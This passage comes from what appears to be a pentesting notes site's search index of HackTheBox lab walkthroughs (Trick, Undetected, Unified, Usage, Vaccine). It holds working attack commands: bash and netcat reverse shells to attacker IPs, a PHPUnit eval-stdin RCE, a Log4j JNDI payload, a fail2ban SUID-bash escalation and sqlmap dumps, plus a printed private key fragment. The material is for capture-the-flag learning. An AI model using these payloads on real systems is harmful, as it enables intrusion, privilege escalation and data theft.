bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP\nJkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN\njsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+\nIJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <p>Now we save it with the name we want and change its permissions:</p> <pre><code>nano key\n# CTRl-MAY V to paste it\n# CTRL-X, Yes and ENTER to save the buffer and exit\nsudo chmod 400 key\n</code></pre> <p>And we can login as michael:</p> <pre><code>ssh -i key michael@10.10.11.166\n</code></pre> <p>In /home/michael we have the user flag: user.txt.</p>","tags":["walkthrough"]},{"location":"htb-trick/#escalation-of-privileges","title":"Escalation of privileges","text":"<p>Getting the system flag. Check michael's groups:</p> <pre><code>id\n</code></pre> <p>Results:</p> <pre><code>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)\n</code></pre> <p>Check michael's permissions:</p> <pre><code>sudo -l\n</code></pre> <p>Results:</p> <pre><code>Matching Defaults entries for michael on trick:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser michael may run the following commands on trick:\n    (root) NOPASSWD: /etc/init.d/fail2ban restart\n</code></pre> <p>Interesting part here is that michael may run fail2ban command as root without any password. This is due to a misconfiguration and we can exploit it.</p> <p>For starters, michael has writing permissions over the configuration files located in /etc/fail2ban/action.d</p> <p>Run:</p> <pre><code>ls -la /etc/fail2ban\n</code></pre> <p>And we can see michael, as part of the security group has rwx rights on the directory owned by root:</p> <pre><code>...\ndrwxrwx---   2 root security  4096 Oct 20 11:03 action.d\n...\n</code></pre> <p>Now we need to understand what fail2ban is and how it works. fail2ban is a great IDPS tool, not only it can detect attacks but also block malicious IP addresses by using Linux iptables. Although fail2ban can be used for services like HTTP, SMTP, IMAP, etc. most sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for a certain period of time or maybe forever.</p> <p>In the file /etc/fail2ban/jail.conf, we can spot some customizations such as ban time and maxretry:</p> <pre><code>cat /etc/fail2ban/jail.conf\n</code></pre> <p>And we see that bantime is limited to 10 seconds and maximum of retries to 5:</p> <pre><code># \"bantime\" is the number of seconds that a host is banned.\nbantime  = 10s\n\n# A host is banned if it has generated \"maxretry\" during the last \"findtime\"\n# seconds.\nfindtime  = 10s\n\n# \"maxretry\" is the number of failures before a host gets banned.\nmaxretry = 5\n</code></pre> <p>This means that if we retry ssh connection six times (so we exceed the maxretry parameter), the file  /etc/fail2ban/action.d/iptables-multiport.conf will be executed as root, and as a consequence, our host will be banned. Now, as part of the security group michael does have rwx permissions on the parent folder /etc/fail2ban/action.d, but not on the file /etc/fail2ban/action.d/iptables-multiport.conf:</p> <pre><code>ls -la /etc/fail2ban/action.d/iptables-multiport.conf\n</code></pre> <p>Result:</p> <pre><code>-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf\n</code></pre> <p>We need then, to be able to edit that file to include our malicious code. As the service fail2ban is restarted every minute or so, you need to execute the following commands quickly. They will allow you to overwrite the file /etc/fail2ban/action.d/iptables-multiport.conf:</p> <pre><code># create a copy of the file to have rwx permissions\nmv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak\n# overwrite the existing file with your copy\ncp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf\n# edit the file and add your lines\nnano /etc/fail2ban/action.d/iptables-multiport.conf\n# In the file, comment the line with the  actionban definition and\n# add:\n# actionban = chmod +s /bin/bash\n# Also in the file, comment the line with the  actionunban definition and\n# add:\n# actionunban = chmod +s /bin/bash\n# CTRL-X -   Yes and ENTER to save changes.\n</code></pre> <p>With \"chmod +s /bin/bash\" we're going to give the suid bit to bash. The suid bit provides the user running it the same privileges that the user who created it. In this case, root is the user who created it. If we run it, we'll have root privileges during its execution. The next step is restarting the service to get the file iptables-multiport.conf updated.</p> <pre><code>sudo /etc/init.d/fail2ban restart\n</code></pre> <p>Now, when we fail to login into the system with ssh more than 5 times, the configuration set in iptables-multiport.conf will take place. For that, from the attacker command line:</p> <ol> <li>We install sshpass, a program that allows us to pass passwords in the command line to ssh. This way we can automate the login process:</li> </ol> <pre><code>sudo apt install sshpass\n</code></pre> <ol> <li>Write a script in the attacker machine:</li> </ol> <pre><code>nano wronglogin.sh\n</code></pre> <pre><code>#!/bin/bash\n\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\nsshpass -p \"wrongpassword\" ssh michael@10.10.11.166\n</code></pre> <p>Add execution permission:</p> <pre><code>chmod +x wronglongin.sh\n</code></pre> <ol> <li>Launch the script:</li> </ol> <pre><code>./wronglogin.sh\n</code></pre> <p>Once the script is executed, the suid bit will be activated for bash. Run:</p> <pre><code> ls -l /bin/bash\n</code></pre> <p>And you will see:</p> <pre><code>-rwsr-sr-x 1 root root 1168776 Oct 20  2022 /bin/bash\n</code></pre> <p>Now if we run:</p> <pre><code>bash -p\n</code></pre> <p>The -p flag turns on privileged mode.  In this mode, the <code>$BASH_ENV' and '$ENV' files are not processed, shell functions are not inherited from the environment, and the</code>SHELLOPTS', 'BASHOPTS', 'CDPATH' and 'GLOBIGNORE' variables, if they appear in the environment, are ignored. The result:</p> <pre><code>michael@trick:~$ bash -p\nbash-5.0# id\nuid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)\nbash-5.0# cd /root\nbash-5.0# ls\nf2b.sh  fail2ban  root.txt  set_dns.sh\n</code></pre> <p>To display the system flag:</p> <pre><code>cat root.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-undetected/","title":"HTB undetected","text":"<pre><code>nmap -sV -sC -Pn $ip --top-ports 4250\n</code></pre> <p>Open ports: 22 and 80.</p> <p>Entering the IP in a browser we get to a website.</p> <p></p> <p>Revising the source code, we see that the menu \"Store\" is linking to http://store.djewelry.htb/.</p> <p>Another way to find out:</p> <pre><code># with gobuster\ngobuster dns -d djewelry.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt \n</code></pre> <p>Open /etc/hosts and add IP and  store.djewelry.htb, djewelry.htb.</p> <p>After browsing around both websites, we found nothing noticeable, so we try to fuzz both subdomains:</p> <pre><code># With wfuzz\nwfuzz -c --hc 404 -t 200 -u http://store.djewelry.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt  \n\nwfuzz -c --hc 404 -t 200 -u http://djewelry.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt  \n</code></pre> <p>Nothing interesting under main domain, but in http://store.djewelry.htb:</p> <pre><code>********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://store.djewelry.htb/FUZZ\nTotal requests: 4614\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                    \n=====================================================================\n\n000000001:   200        195 L    475 W      6203 Ch     \"http://store.djewelry.htb/\n                                                        \"                          \n000000013:   403        9 L      28 W       283 Ch      \".htpasswd\"                \n000000012:   403        9 L      28 W       283 Ch      \".htaccess\"                \n000000011:   403        9 L      28 W       283 Ch      \".hta\"                     \n000001114:   301        9 L      28 W       322 Ch      \"css\"                      \n000001648:   301        9 L      28 W       324 Ch      \"fonts\"                    \n000002021:   200        195 L    475 W      6203 Ch     \"index.php\"                \n000001991:   301        9 L      28 W       325 Ch      \"images\"                   \n000002179:   301        9 L      28 W       321 Ch      \"js\"                       \n000003588:   403        9 L      28 W       283 Ch      \"server-status\"            \n000004286:   301        9 L      28 W       325 Ch      \"vendor\"                   \n\nTotal time: 0\nProcessed Requests: 4614\nFiltered Requests: 4603\nRequests/sec.: 0\n</code></pre> <p>/vendor is a directory list, so we can browse all files and folders under /vendor.</p> <p>After browsing for a while, we get information about this plugin with a vulnerable version installed  (all plugins installed with versions: http://store.djewelry.htb/vendor/composer/installed.json). Vulnerable plugin is \"phpunit/phpunit\",\"5.6.2\".</p> <p>Some exploits:</p> <p>https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/</p> <p>In my case:</p> <pre><code>curl -XGET --data \"&lt;?php system('whoami');?&gt;\" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n</code></pre> <pre><code>www-data\n</code></pre> <p>Now, we can get a reverse shell:</p> <p>My reverse code before b64 it: \"bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1\"</p> <pre><code>curl -XGET --data \"&lt;?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQo=|base64 -d|bash'); ?&gt;\" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n</code></pre> <p>See a walkthrough: https://0xdf.gitlab.io/2022/07/02/htb-undetected.html</p>"},{"location":"htb-unified/","title":"Walkthrough - Unified - A HackTheBox machine","text":"<p>Enumerate open services:</p> <pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <p>Results:</p> <pre><code>PORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=\n|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=\n|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR\n6789/tcp open  ibm-db2-admin?\n8080/tcp open  http-proxy\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Mon, 08 May 2023 10:46:41 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 \n|     Found&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 \n|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 302 \n|     Location: http://localhost:8080/manage\n|     Content-Length: 0\n|     Date: Mon, 08 May 2023 10:46:41 GMT\n|     Connection: close\n|   RTSPRequest, Socks5: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Mon, 08 May 2023 10:46:41 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|_http-open-proxy: Proxy might be redirecting requests\n8443/tcp open  ssl/nagios-nsca Nagios NSCA\n| http-title: UniFi Network\n|_Requested resource was /manage/account/login?redirect=%2Fmanage\n| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York\n| Subject Alternative Name: DNS:UniFi\n| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2021-12-30T21:37:24\n| Not valid after:  2024-04-03T21:37:24\n| MD5:   e6be8c035e126827d1fe612ddc76a919\n| SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829\n| -----BEGIN CERTIFICATE-----\n| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV\n</code></pre> <p>After visiting https://10.129.96.149:8080/, we are redirected to https://10.129.96.149:8443/manage/account/login</p> <p>It's a login panel of Unifi application and version is disclosed: 6.4.54. A quick search in google for \"exploit unifi 6.4.54\" returns that it has a log4j vulnerability.</p> <p>For exploiting it:</p> <pre><code>sudo apt install openjdk-11-jre maven\n\n\n\ngit clone https://github.com/veracode-research/rogue-jndi \n\ncd rogue-jndi\n\nmvn package\n\n# Once it's build, make a reverse shell in base64 with attacker machine and listening port\necho 'bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.2/4444 0&gt;&amp;1' | base64\n# This will return: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK\n\n# Get out of rogue-jndi folder and\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}\" --hostname \"10.129.96.149\"\n# In the bash command, copy paste your reverse shell in base64\n# --hostname: Victim IP\n</code></pre> <p>Now, open a terminal, launch netcat abd the listening port you defined in your payload.</p> <p>With Burpsuite, get a request for login:</p> <pre><code>POST /api/login HTTP/1.1\nHost: 10.129.96.149:8443\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.129.96.149:8443/manage/account/login\nContent-Type: application/json; charset=utf-8\nOrigin: https://10.129.96.149:8443\nContent-Length: 104\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n{\"username\":\"lala\",\"password\":\"lele\",\"remember\":false,\"strict\":true}\n</code></pre> <p>As we can read from the Unifi version exploit, the injectable parameter is \"remember\". So we insert there our payload and with Repeater, send the request:</p> <pre><code>POST /api/login HTTP/1.1\nHost: 10.129.96.149:8443\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.129.96.149:8443/manage/account/login\nContent-Type: application/json; charset=utf-8\nOrigin: https://10.129.96.149:8443\nContent-Length: 104\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n{\"username\":\"lala\",\"password\":\"lele\",\"remember\":\"${jndi:ldap://10.10.14.2:1389/o=tomcat}\",\"strict\":true}\n</code></pre> <p>Once we send that request, our jndi server will resend the reverse shell:</p> <p></p> <p>And in our terminal with the nc listener we will get the reverse shell. Spawn it with:</p> <pre><code>SHELL=/bin/bash script -q /dev/null\nCtrl-Z\nstty raw -echo\nfg\nreset\nxterm\n</code></pre> <p>user.txt is under /home/michael/</p>","tags":["walkthrough","log4j","jndi","mongodb"]},{"location":"htb-unified/#privilege-escalation","title":"Privilege escalation","text":"<p>Do some basic reconnaissance:</p> <pre><code>whoami\nid\ngroups\nsudo -l\nuname -a\n</code></pre> <p>Also we can see /etc/passwd to see other existing services/users.</p> <p>``bash cat /etc/passwd <pre><code>Results:\n</code></pre> root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin unifi:x:999:999::/home/unifi:/bin/sh mongodb:x:101:102::/var/lib/mongodb:/usr/sbin/nologin <pre><code>After user unifi, we have a mondodb service. Also, we knew that under unifi version 6.4.54, it we could get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. \n\n[See mongodb cheat sheet](27017-27018-mongodb.md). \n\nFirst thing, find out on which port is running the service:\n</code></pre> ps aux | grep mongo <pre><code>Results: \n</code></pre> unifi         67  0.4  4.2 1103744 85568 ?       Sl   11:44   0:46 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1 unifi       5183  0.0  0.0  11468  1108 pts/0    S+   14:47   0:00 grep mongo <pre><code>Port 27117. Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace.\n\nFrom the terminal of the victim's machine:\n\n```bash\nmongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\n# mongo: To use mongo interactive command line\n# --port: Indicate the port\n# ace: default database in mongo\n# --eval: evaluate JSON\n</code></pre></p> <p>And now we have...</p> <pre><code>MongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/ace\nMongoDB server version: 3.6.3\n{\n        \"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\"),\n        \"name\" : \"administrator\",\n        \"email\" : \"administrator@unified.htb\",\n        \"x_shadow\" : \"$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.\",\n        \"time_created\" : NumberLong(1640900495),\n        \"last_site_name\" : \"default\",\n        \"ui_settings\" : \n``\n\nThe output reveals a user called administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility. The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.\n\n```bash\nmkpasswd -m sha-512 lalala \n</code></pre> <p>It returns: $6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0</p> <p>With that, now we can update the administrator password. From the terminal of the victim's machine:</p> <pre><code>mongo --port 27117 ace --eval 'db.admin.update({\"_id\":\nObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$bTJCdmWvffwcSm9p$6FHYn1fesp3WjZesRG20dDQ/bp6Vktrq8aLylXvil8tApzFCguM2MEii63Uemf8BE7jBrB5ZcZwes85JpuXPq0\"}})'\n# ObjectId is the one that correlates with the administrator one.\n</code></pre> <p>Now, in the admin panel from the browser enter the new credentials for administrator.</p> <p>When logged into the dashboard, grab ssh credentials for root user from Settings&gt;Site, tab \"Device Authentication\", SSH Authentication.</p> <p>With those credentials, access via ssh connection.</p>","tags":["walkthrough","log4j","jndi","mongodb"]},{"location":"htb-usage/","title":"Walkthrough - Usage, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-usage/#about-the-machine","title":"About the machine","text":"data Machine Usage Platform Hackthebox url link OS Linux Difficulty Easy Points 20 ip 10.10.11.18","tags":["walkthrough"]},{"location":"htb-usage/#getting-usertxt-flag","title":"Getting user.txt flag","text":"","tags":["walkthrough"]},{"location":"htb-usage/#enumeration","title":"Enumeration","text":"<pre><code>sudo nmap -sV -sC $ip -p-\n</code></pre> <p>Results:  Port 22 and 80.</p>","tags":["walkthrough"]},{"location":"htb-usage/#browsing-the-app","title":"Browsing the app","text":"<p>After entering in http://10.10.11.18, a dns error is displayed. The page is redirected to http://usage.htb.</p> <p>I will add that line in my host resolver config file.</p> <pre><code># testing for an existing file\necho \"10.10.11.18    http://usage.htb\" &gt;&gt; /etc/hosts\n</code></pre> <p>The application is simple. A Login pannel with a \"Remember your password\" link. An other links to an admin login pannel and a logout feature. Enumeration techniques also gives us some ideas about Laravel framework being in use.</p> <p>After testing the login form and the remember your password form, I can detect a SQL injection vulnerability in the remember your password form.</p> <p>Previously I registered a user lala@lala.com.</p> <p></p> <p>Payloads for manual detection:</p> <pre><code>lala@lala.com' AND 1=1;-- -\n</code></pre> <p></p> <pre><code>lala@lala.com' AND 1=1;-- -\n</code></pre> <p></p> <p>Now, we know that we have a SQL injection, Blind with the AND Boolean technique, so we can use sqlmap with --technique flag set to BUT. We can also save time using the flag <code>--dbms</code> to indicate that is a mysql database:</p> <pre><code>sqlmap -r request.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch --dbs --dump --threads 3\n\nsqlmap -r request.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch -D usage_blog --tables --dump --threads 3\n\nsqlmap -r request.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch -D usage_blog -T admin_users --dump --threads 3\n</code></pre>","tags":["walkthrough"]},{"location":"htb-usage/#upload-a-reverse-shell","title":"Upload a reverse shell","text":"<p>The admin profile can be edited. The upload feature for the avatar image is vulnerable. </p> <p>First, I tried to upload a php file, but files extensions are sanitized client side.</p> <p></p> <p>Then, I uploaded a php reverse shell file using jpg extension. The file was uploaded but it was not executable. </p> <p>Finally I used Burpsuite and intercepted the upload of my ivan.jpg file. During the interception I modified the extension to php.</p> <p></p> <p>Finally the reverse shell worked. But for a limited period of time (see steps 1 and 2). Time enough to set up a hook and establish a new connection (see steps 2 and 3) with a  bash reverse shell</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.49 4444 &gt;/tmp/f\n</code></pre> <p></p>","tags":["walkthrough"]},{"location":"htb-usage/#getting-usertxt","title":"Getting user.txt","text":"<p>First, I spawned a shell:</p> <pre><code>SHELL=/bin/bash script -q /dev/null\n</code></pre> <p>and printed out the flag:</p> <pre><code>cat /home/dash/user.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-usage/#getting-roottxt","title":"Getting root.txt","text":"<p>First, I perform a lateral movement to the other user present in the machine. For that I cat the /etc/passwd file and I run linpeas.sh script in the machine. </p>","tags":["walkthrough"]},{"location":"htb-usage/#lateral-movement","title":"Lateral movement","text":"<p>Enumerate other users with access to a bash terminal:</p> <pre><code>cat /etc/passwd | grep -E ^*/bin/bash$\n</code></pre> <p>Results:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndash:x:1000:1000:dash:/home/dash:/bin/bash\nxander:x:1001:1001::/home/xander:/bin/bash\n</code></pre> <p>Upload the script linpeas to the victims machine.</p> <pre><code>################\n# In the attacker machine\n###############\n# Download the script from the release page\ncurl https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh\n\n# Copy the file to the root of your apache server\ncp linpeas.sh /var/wwww/html\n\n# Start your server \nservice apache2 start\n# Turn it off once you have served your file\n\n################\n# From the victim machine\n################\n# Download the script from the release page or from the attacker server\nwget http://attackerIP/linpeas.sh\n\n# Run the script\nchmod +x linpeash.sh\n./linpeas.sh\n</code></pre> <p>Some interesting takeaways from the linpeas.sh results:</p> <p></p> <p></p>","tags":["walkthrough"]},{"location":"htb-vaccine/","title":"Vaccine - A HackTheBox machine","text":"<p><pre><code>nmap -sC -sV $ip -Pn\n</code></pre> Two open ports: 21 and 80</p> <p>Also, from nmap analysys, ftp service at 21 allows us to use anonymous signin with empty password:</p> <pre><code>ftp $ip\n\n# enter user \"anonymous\" and hit enter when prompted for password\n</code></pre> <pre><code>dir\n# listed appears file backup.zip\n\nget *\n</code></pre> <p>Try to open zip file, but it's password protected, so we crak it with johntheripper:</p> <pre><code>zip2john nameoffile.zip &gt; zip.hashes\ncat zip.hashes\njohn zip.hashes\n# Proceeding with wordlist:/usr/share/john/password.lst\n# 741852963        (backup.zip)    \n\n\n#Unzip file:\nunzip backup.zip\n\n# Echo index file\ncat index.php\n</code></pre> <p>Before the html code there is a piece of php starting the session. Username and password are hard encoded there:</p> <pre><code>&lt;?php\nsession_start();\n  if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {\n    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") {\n      $_SESSION['login'] = \"true\";\n      header(\"Location: dashboard.php\");\n    }\n  }\n?&gt;\n</code></pre> <p>In crackstation.net, we obtain that the hash \"2cb42f8734ea607eefed3b70af13bbd3\" was md5 encrypted and that actual password is \"qwerty789\"</p> <p>With this, open browser and enter username and password. You will be redirected to: htpp://$ip/dashboard.php</p> <p>Search box triggers a error message on frontend when introducing simple quotation mark as imput \"'\":</p> <pre><code> ERROR: unterminated quoted string at or near \"'\" LINE 1: Select * from cars where name ilike '%'%' ^\n</code></pre> <p>This tells us about a sql injection vulnerability.</p> <pre><code># Ask for backend DBMS\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch      \n\n#---------\n# [11:03:27] [INFO] the back-end DBMS is PostgreSQL\n#web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)\n#web application technology: Apache 2.4.41\n#back-end DBMS: PostgreSQL\n\n\n\n# Ask for databases\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch --dbs\n\n# ------\n# [11:06:12] [INFO] fetching database (schema) names available databases [3]:\n# [*] information_schema\n# [*] pg_catalog\n# [*] public\n\n\n\n# Ask for tables in db pg_catalog\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch -D pg_catalog --tables\n\n# Response contains 62 tables. \n\n\n# Ask for users\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch --users \n\n# -----\n# [11:10:16] [INFO] resumed: 'postgres'\n# database management system users [1]:\n# [*] postgres\n\n\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch -D pg_catalog -T pg_user -C passwd,usebypassrls,useconfig,usecreatedb,usename,userepl,usesuper,usesysid,valuntil --dump\n\n\n\n# Ask for passwords\nsqlmap -u 